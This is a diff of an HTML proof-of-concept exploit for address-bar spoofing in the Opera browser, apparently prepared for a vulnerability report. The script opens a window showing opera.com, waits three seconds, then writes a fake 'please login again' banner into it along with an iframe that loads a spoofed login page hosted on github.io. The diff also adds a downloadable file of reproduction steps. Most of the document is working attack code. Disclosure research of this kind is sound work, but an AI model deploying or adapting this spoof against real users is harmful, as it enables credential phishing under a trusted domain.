@@ -6,22 +6,17 @@
 
 <style>
 body{
-font-family:Arial;
+font-family: Arial;
 text-align:center;
 margin-top:80px;
 background:#f5f5f5;
 }
 
 button{
-padding:12px 20px;
+padding:12px 18px;
 font-size:16px;
+margin:10px;
 cursor:pointer;
-}
-
-.note{
-color:red;
-font-size:13px;
-margin-bottom:10px;
 }
 
 iframe{
@@ -30,27 +25,23 @@ height:85vh;
 border:none;
 }
 
-.banner{
-background:#eeeeee;
-padding:10px;
-font-size:14px;
-border-bottom:1px solid #ccc;
+.note{
+color:red;
+font-size:13px;
 }
 </style>
 
 <script>
 
-function go(){
+function startTest(){
 
-// open trusted domain
-var win = window.open("https://www.opera.com:8080");
+var win = window.open("https://opera.com:90");
 
 if(!win){
 alert("Popup blocked. Please allow popups.");
 return;
 }
 
-// race condition delay
 setTimeout(function(){
 
 try{
@@ -66,14 +57,12 @@ win.document.write(`
 body{
 margin:0;
 font-family:Arial;
-background:white;
 }
 
 .banner{
 background:#f2f2f2;
 padding:12px;
 text-align:center;
-font-size:14px;
 border-bottom:1px solid #ccc;
 }
 
@@ -88,15 +77,14 @@ border:none;
 <body>
 
 <div class="banner">
-⚠ opera.com security check – please login again
+opera.com under maintenance – please login again
 </div>
 
-<p style="text-align:center;color:red;font-size:13px">
-Content below is attacker controlled while the address bar shows opera.com
+<p style="text-align:center;color:red;font-size:13px;">
+Content below is attacker-controlled while the address bar shows opera.com
 </p>
 
 <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
-<iframe src="https://permission.site/"></iframe>
 
 </body>
 </html>
@@ -107,11 +95,45 @@ win.document.close();
 
 }catch(e){
 
-console.log("Injection blocked:",e);
+console.log("Blocked:", e);
 
 }
 
 },3000);
+
+}
+
+
+// create and download txt file
+function downloadTxt(){
+
+const content = `
+Opera Address Bar Spoofing PoC
+
+Researcher: unthrz
+
+Steps to Reproduce:
+
+1. Open poc.html in Opera or Opera GX
+2. Click "Start Test"
+3. A new window opens with opera.com:90 in the address bar
+4. Click once inside the address bar
+5. Wait approximately 3 seconds
+6. The page content becomes attacker-controlled while the URL remains opera.com
+
+Impact:
+
+Attackers may display phishing content while the browser shows a trusted domain.
+`;
+
+const blob = new Blob([content], {type:"text/plain"});
+
+const link = document.createElement("a");
+
+link.href = URL.createObjectURL(blob);
+link.download = "file.txt";
+
+link.click();
 
 }
 
@@ -123,11 +145,13 @@ console.log("Injection blocked:",e);
 
 <h2>Opera Address Bar Spoofing PoC</h2>
 
-<p>
-This demonstration shows attacker-controlled content while the browser address bar displays a trusted domain.
-</p>
+<p>This PoC demonstrates attacker-controlled content while the browser address bar shows a trusted domain.</p>
 
-<button onclick="go()">Start Test</button>
+<button onclick="startTest()">Start Test</button>
+
+<br>
+
+<button onclick="downloadTxt()">Download file.txt</button>
 
 </body>
 </html>
